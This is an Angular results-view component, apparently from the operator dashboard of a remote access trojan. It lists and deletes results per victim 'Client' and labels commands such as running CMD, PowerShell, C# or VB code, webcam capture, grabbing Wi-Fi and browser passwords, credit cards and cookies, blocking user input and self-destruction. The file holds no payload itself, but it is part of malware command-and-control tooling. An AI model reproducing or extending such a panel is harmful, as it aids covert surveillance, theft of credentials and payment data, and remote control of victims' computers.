import { CommonModule } from '@angular/common';
import { Component, OnInit } from '@angular/core';
import { ClientService } from '../../../services/client.service';
import { ActivatedRoute, Router } from '@angular/router';
import { Result } from '../../../models/response.module';
import { ToastService } from '../../../../toast.service';

@Component({
  selector: 'app-results',
  standalone: true,
  imports: [CommonModule],
  templateUrl: './results.component.html',
  styleUrl: './results.component.scss',
})
export class ResultsComponent implements OnInit {
  ClientId: string | null = null;
  ResultsList: Result[] = [];
  ErrorMessage: string = '';

  constructor(
    private clientService: ClientService,
    private route: ActivatedRoute,
    private router: Router,
    private toastService:ToastService

  ) {}
  ngOnInit(): void {
    this.route.paramMap.subscribe((param) => {
      this.ClientId = param.get('id');
      if (this.ClientId == null) {
        this.router.navigate(['/Client']);
      }
    });
    this.loadData();
    
  }
  DeleteAll(){
    if (this.ClientId != null) {
      const ResultsReq = this.clientService.DeleteClientResults(this.ClientId);
      if (ResultsReq != null) {
        ResultsReq.subscribe(
          (response) => {
            this.toastService.showToast("Opeartion Has Been Done Successfully !")
            this.loadData();
          },
          (error) => {}
        );
      }
    }
  }
  loadData(){
    if (this.ClientId != null) {
      const ResultsReq = this.clientService.GetClientResults(this.ClientId);
      if (ResultsReq != null) {
        ResultsReq.subscribe(
          (response) => {
            this.ResultsList = response;
          },
          (error) => {}
        );
      }
    }
  }
  truncate(value: string, limit: number = 25): string {
    return value.length > limit ? value.substring(0, limit) + '...' : value;
  }
  GetActionDescription(optionValue: number) {
    switch (optionValue) {
      case 0:
        return 'Upload From Target';
      case 1:
        return 'Download To Target';
      case 2:
        return 'Execute CMD';
      case 3:
        return 'Execute Powershell';
      case 4:
        return 'Webcam';
      case 5:
        return 'Grab Wifi Passwords';
      case 6:
        return 'Grab Browsers Passwords';
      case 7:
        return 'Grab Browsers Credit Cards';
      case 8:
        return 'Grab Browsers Cookies';
      case 9:
          return "Execute C# Code";
      case 10:
          return "Execute VB Code";
      case 11:
            return "Mute / Unmute Sound";
      case 12:
            return "Volume Up";
      case 13:
            return "Volume Down";
      case 14:
            return "Block User Input";
      case 15:
            return "Unblock User Input";
      case -1:
        return 'Destroy Himself';
      case -2:
        return 'Update Info';
      default:
        return 'Invalid Option';
    }
  }
  isModalOpen = false;
  ActionName:string=""
  ActionsArgs:string=""
  ActionsOutput:string=""
  ActionID:number=0;
  ShowResult(inst:Result){
    this.ActionName=this.GetActionDescription(inst.code);
    this.ActionID=inst.instructionId;
    this.ActionsArgs=inst.functionArgs==undefined?"No Args":inst.functionArgs;
    this.ActionsOutput=inst.output==undefined?"No Args":inst.output;
    this.isModalOpen=true;
  }
  onBackgroundClick(event: MouseEvent) {
    if (event.target === event.currentTarget) {
      this.isModalOpen = false;;
    }
  }

  onCloseClick() {
      this.isModalOpen = false;;
  }
}
